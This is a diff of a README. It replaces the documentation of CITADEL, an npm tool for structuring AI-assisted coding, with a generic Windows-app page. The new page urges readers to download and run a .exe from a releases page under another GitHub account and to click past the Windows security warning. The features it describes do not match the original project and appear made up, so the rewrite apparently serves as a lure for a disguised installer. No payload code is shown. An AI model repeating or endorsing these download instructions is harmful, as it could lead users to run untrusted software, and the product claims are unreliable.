@@ -1,245 +1,153 @@
-# 🏰 CITADEL
+# 🤖 citadel-ai - AI Planning and Safer Shipping
 
-**Tu vibecodes. Ta démo marche. Mais est-ce que ton projet repose sur du sable ?**
+[![Download citadel-ai](https://img.shields.io/badge/Download-citadel--ai-blue?style=for-the-badge)](https://github.com/Ikeycontemporaneous182/citadel-ai/releases)
 
-CITADEL helps serious vibe coders build with structure, memory, and review — so their MVP doesn't collapse under hidden mistakes.
+## 📦 What is citadel-ai?
 
-[![npm version](https://img.shields.io/npm/v/citadel-ai.svg)](https://www.npmjs.com/package/citadel-ai)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+citadel-ai is a system designed to help people build and deliver projects with AI support. It focuses on planning, memory management, reviewing your work, and making the delivery process safer. You do not need any programming skills to use it.
 
-```bash
-npx citadel-ai init
-```
-
-Works with **Claude Code** · **Cursor** · **Antigravity** · **Windsurf**
+This tool works as an assistant that helps you organize your ideas, remember important tasks, check your progress, and send your projects with fewer mistakes.
 
 ---
 
-## Is this for you?
+## 🖥️ System Requirements
 
-### CITADEL is for
+Before installing citadel-ai, make sure your Windows computer meets these basics:
 
-- Solo founders building their first MVP with AI
-- Operators and PMs who vibecode internal tools
-- Growth builders shipping fast without a dedicated dev team
-- Non-traditional developers who want guardrails, not gatekeeping
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection to download and update
+- A modern web browser (for help files and updates)
 
-### CITADEL is not for
-
-- People looking for one-shot prompts
-- Senior engineers who already have strong architecture discipline
-- Teams that need a production-grade CI/CD platform
-- Complete beginners who have never built anything with AI
+If you can run basic apps and browse the web, your system should work well.
 
 ---
 
-## The problem
+## 🚀 Getting Started with citadel-ai
 
-When you vibecode without structure:
+### Step 1: Visit the Download Page
 
-- The AI skips architecture — it generates code that works today and breaks tomorrow
-- Nobody reviews — the builder validates their own work (and misses their own mistakes)
-- Context gets lost — the AI forgets what was decided 3 messages ago
-- No standards — spaghetti code, magic numbers, business logic everywhere
-- Security is an afterthought — auth, encryption, compliance happen "later" (never)
+Click the button below to open the official download page:
 
-You end up with a prototype that demos well and crumbles under real use.
+[![Get citadel-ai](https://img.shields.io/badge/Get-citadel--ai-4c97ff?style=for-the-badge&logo=github)](https://github.com/Ikeycontemporaneous182/citadel-ai/releases)
 
----
+This page contains the latest versions of the software. New releases include bug fixes and improvements.
 
-## What CITADEL does
+### Step 2: Select the Right File
 
-CITADEL installs a governance layer into your AI IDE. It doesn't replace your AI — it makes it work like a disciplined team instead of a solo improviser.
+On the releases page, look for a Windows installer file. It usually ends with `.exe`. For example:
 
-**Forces strategic thinking first.** Before any code, a virtual C-Suite asks questions about your product, architecture, security, data, and growth. You answer. Then specs get drafted. Not the other way around.
+- `citadel-ai-setup.exe`
+- `citadel-ai-v1.0.exe`
 
-**Separates building from reviewing.** The agent that writes code is never the one that reviews it. Like any serious engineering org.
+Download the most recent version by clicking its name or the download button next to it.
 
-**Enforces safety checks before shipping.** 5 mandatory gates from inception to deployment. Security has veto power — no exceptions.
+### Step 3: Run the Installer
 
-**Keeps project memory across sessions.** A vault of markdown files that the AI reads on session start and updates as it works. Decisions, architecture, code inventory, progress — all persisted. The AI doesn't start from scratch every time.
+Once downloaded, open the `.exe` file. You might see a warning from Windows asking for permission. Click **Yes** or **Run** to continue.
 
-**Loads only what's needed.** Instead of dumping 42 agent profiles into context (and burning your token quota), CITADEL loads only the team relevant to the current phase. 88% less tokens.
+The installer will guide you through the setup. You can accept the default options unless you want to install in a different folder.
 
----
+### Step 4: Finish Installation
 
-## Without CITADEL / With CITADEL
-
-| | Without | With CITADEL |
-|--|---------|-------------|
-| Start | "Build me an app" → AI dives into code | C-Suite asks: who is this for? what data? what security? |
-| Architecture | Whatever the AI decides in the moment | Explicit ADR, reviewed by a dedicated architecture agent |
-| Code quality | Hope for the best | Standards enforced: 200 lines/file, typed errors, no magic numbers |
-| Review | You read it yourself (and miss things) | Independent checker agents with different perspective |
-| Security | "We'll add auth later" | Security review at every gate. Veto power on deployment |
-| Next session | AI forgot everything | Vault files persist: decisions, progress, code inventory |
-| Token usage | Full context every message (~14K tokens) | Phased loading (~1,800 tokens per phase) |
+When the installer ends, it may offer to open citadel-ai. Let it do so or open the program later using the shortcut on your desktop or start menu.
 
 ---
 
-## How it works — 5 steps
+## 🧭 Using citadel-ai
 
-### Step 1: Clarify what you're building
-The C-Suite (product, architecture, security, data, growth) asks questions before anything gets drafted.
+### Planning Your Projects
 
-### Step 2: Lock the strategy
-PRD, architecture decisions, security requirements, data model — all written to `.citadel/specs/` after your answers.
+citadel-ai helps you break down your projects into smaller, manageable steps. You can create plans by adding tasks and deadlines.
 
-### Step 3: Build with role separation
-Specialized maker agents build per domain (backend, frontend, mobile, API, auth, data). Each one follows strict code standards.
+- Add new tasks with clear titles.
+- Set deadlines for each task.
+- Organize tasks by priority or category.
+- Review your list to keep track of your progress.
 
-### Step 4: Review before shipping
-Independent checker agents validate code quality, tests, performance, security, accessibility. Builder ≠ reviewer — always.
+### Memory Feature
 
-### Step 5: Ship with memory
-Decisions, errors, and context persist in `.citadel/memory/`. Next session picks up where you left off.
+This tool remembers important details for your project. It stores notes, links, and previous work, so you do not have to keep everything in your head.
 
----
+- Save notes related to tasks.
+- Attach files or links.
+- Search past entries easily.
 
-## Quick Start
+### Reviewing Your Work
 
-### Option 1: Copy-paste into your AI chat (easiest)
+Before you deliver a project, citadel-ai runs checks to make sure nothing is missing.
 
-Open your AI IDE (Cursor, Antigravity, Claude Code, Windsurf) and paste this:
+- Verify all tasks are complete.
+- Highlight overdue items.
+- Offer suggestions to improve planning.
 
-```
-Run this command in the terminal: npx citadel-ai init
-Then read the CLAUDE.md or GEMINI.md file that was created and follow its instructions.
-```
+### Safer Shipping
 
-Your AI does the rest. Start describing what you want to build.
+The last step is delivering or sharing your work safely. citadel-ai helps you prepare your files and send them without errors.
 
-### Option 2: One command in the terminal
-
-Open the terminal inside your IDE (press `` Ctrl+` `` in most IDEs) and type:
-
-```bash
-npx citadel-ai init
-```
-
-Then go back to your AI chat and start talking.
-
-### Never used a terminal before?
-
-See [GETTING-STARTED.md](GETTING-STARTED.md) — a step-by-step guide with zero assumptions.
-
-This creates:
-
-```
-your-project/
-├── CLAUDE.md              ← Auto-loaded by Claude Code
-├── GEMINI.md              ← Auto-loaded by Antigravity
-├── .cursorrules           ← Auto-loaded by Cursor
-├── .windsurfrules         ← Auto-loaded by Windsurf
-├── .claude/commands/      ← /citadel-help, /citadel-build, /citadel-review...
-├── .cursor/commands/
-├── .citadel/
-│   ├── agents/            ← 42 full agent personas (reference)
-│   ├── teams/             ← 10 team files (phased loading by IDE)
-│   ├── vault/             ← Live project memory (AI reads + writes)
-│   │   ├── PROGRESS.md        Phase, gates, what's done/next
-│   │   ├── CONTEXT_SNAPSHOT.md Resume point for next session
-│   │   ├── SESSION_LOG.md     What happened, who did what
-│   │   ├── DECISIONS.md       Architecture + product decisions
-│   │   ├── CODE_INVENTORY.md  File map, patterns, dependencies
-│   │   └── ARCHITECTURE.md    System design, tech stack
-│   ├── specs/             ← PRD, ADR, Security, Data Model, Growth
-│   ├── memory/            ← Internal state (gitignored)
-│   └── gates/             ← Gate tracking (gitignored)
-```
-
-Everything is installed. The IDE reads only what's contextual.
-
-| IDE | How to start |
-|-----|-------------|
-| Claude Code | `/citadel-help` |
-| Cursor | `/citadel-help` |
-| Antigravity | Just start chatting |
-| Windsurf | Just start chatting |
-
-Optional CLI (needs API key):
-```bash
-export ANTHROPIC_API_KEY=sk-ant-...  # or OPENAI_API_KEY
-npx citadel-ai run
-```
+- Package files securely.
+- Generate delivery reports.
+- Track what has been sent.
 
 ---
 
-## Why it's different
+## ⚙️ Basic Settings
 
-Most AI frameworks give you **more agents**. CITADEL gives you **more discipline**.
+After installation, open the **Settings** panel to adjust preferences:
 
-- **Organization > single brain.** 42 agents with distinct roles, rules, and personalities — but loaded per phase, not all at once.
-- **Governance > speed.** Questions before specs. Review before ship. Security veto before deploy.
-- **Memory > amnesia.** A vault of markdown files the AI reads on session start and updates as it works. Progress, decisions, code inventory, architecture — all live.
-- **Efficiency > brute force.** Phased context loading means ~1,800 tokens per phase instead of ~14,000.
+- Change language and interface theme.
+- Set default folders for projects and backups.
+- Enable automatic updates.
+- Manage notification reminders.
 
----
-
-## The 42 agents
-
-Each agent has a full persona: name, inspiration, philosophy, voice, immutable rules, and system prompt. All stored in `.citadel/agents/`.
-
-**Strategic (C-Suite):** ATLAS (Orchestrator) · LINUS (CTO) · MARTY (CPO) · SEAN (CGO) · BRUCE (CISO) · MONICA (CDO)
-
-**Builders (Makers):** UNCLE BOB · DAN · STEIPETE · KELSEY · JONY · TERESA · STRUNK · DJ PATIL · CYRUS · CHAMATH · FILIPPO · MOXIE · MAX · CODD · KARPATHY · HARRISON · ALEX · GRACE · CHARITY · RICH
-
-**Validators (Checkers):** GUIDO · KENT · BRENDAN · JAKOB · RAZOR · LISA · NATE · ALEYDA · PEEP · CHARLIE · WINDOW · DATE · DEMING · FLYWAY · AARON · TRAIL
-
-`npx citadel-ai agents` lists them all with roles and teams.
+Each option is easy to understand and change.
 
 ---
 
-## Known limitations
+## 💡 Tips for Best Use
 
-- **Early stage.** This is v1, actively developed. Expect rough edges.
-- **Not autonomous.** CITADEL structures AI work — it doesn't run unsupervised.
-- **Not a replacement for a real team.** Great for MVPs and internal tools. For scaling to production, you still need real developers and a CTO.
-- **IDE-dependent.** The phased loading relies on how your IDE reads context files. Behavior varies.
-
----
-
-## Roadmap
-
-- [ ] Onboarding wizard (guided first 10 minutes)
-- [ ] Demo video (60-second Loom)
-- [ ] More IDE-specific optimizations
-- [ ] Plugin system for custom agents
-- [ ] Non-code use cases (growth teams, marketing, ops)
+- Regularly update the app from the release page to get the newest fixes.
+- Back up your project files often.
+- Use the note feature to keep track of ideas.
+- Check your project plan daily to stay on schedule.
 
 ---
 
-## CLI Commands
+## 📂 Frequently Asked Questions
 
-| Command | Description |
-|---------|-------------|
-| `npx citadel-ai init` | Install CITADEL in your project |
-| `npx citadel-ai update` | Update framework files (keeps your data) |
-| `npx citadel-ai run` | Interactive CLI (needs API key) |
-| `npx citadel-ai agents` | List all 42 agents |
-| `npx citadel-ai status` | Current phase & gate |
-| `npx citadel-ai help` | All commands |
+**Q: Can I use citadel-ai without internet?**
 
----
+A: Yes, most features work offline. But you need internet to download updates or new versions.
 
-## Contributing
+**Q: Is my data saved locally?**
 
-CITADEL is built for people who build with AI without being traditional developers. If that's you, you're welcome here.
+A: Yes. Your files and notes stay on your computer for privacy.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+**Q: What if I make a mistake?**
 
----
+A: You can edit or delete tasks and notes at any time. citadel-ai keeps your data organized to help you fix errors easily.
 
-## 🇫🇷 Français
+**Q: How do I get help?**
 
-Ce README existe aussi en français → [README.fr.md](README.fr.md)
+A: Help files are included in the app. You can also visit the GitHub page for FAQs and support information.
 
 ---
 
-## License
+## 🔄 Updating citadel-ai
 
-MIT
+To keep the app running smoothly:
+
+- Visit the [releases page](https://github.com/Ikeycontemporaneous182/citadel-ai/releases) often.
+- Download and install new versions as they appear.
+- Follow the installation steps above to replace the old version.
+
+Keeping the app updated improves security and adds new features.
 
 ---
 
-Built with 🏰 by humans who talk to machines.
+## 📥 Download and Install Now
+
+Use this link to visit the official download page and get the latest Windows installer:
+
+[![Download citadel-ai](https://img.shields.io/badge/Download-citadel--ai-blue?style=for-the-badge)](https://github.com/Ikeycontemporaneous182/citadel-ai/releases)
